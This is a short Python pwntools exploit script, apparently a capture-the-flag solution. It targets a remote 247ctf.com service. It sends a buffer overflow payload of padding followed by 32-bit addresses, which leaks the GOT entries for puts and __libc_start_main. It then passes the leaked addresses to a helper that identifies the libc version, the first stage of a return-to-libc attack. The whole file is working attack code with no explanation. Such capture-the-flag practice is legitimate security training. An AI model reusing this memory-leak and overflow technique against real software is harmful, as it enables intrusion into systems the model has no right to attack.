from pwn import *

import TheNight

import sys

target = remote("ecca55a329712cda.247ctf.com", 50025)
payload = ""
payload += "00000000000000000000000000000000000000000000"
payload += p32(0x8048390)
payload += p32(0x8048390)
payload += p32(0x804a018)
payload += p32(0x804a01c)
target.sendline(payload)
target.recvline()
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
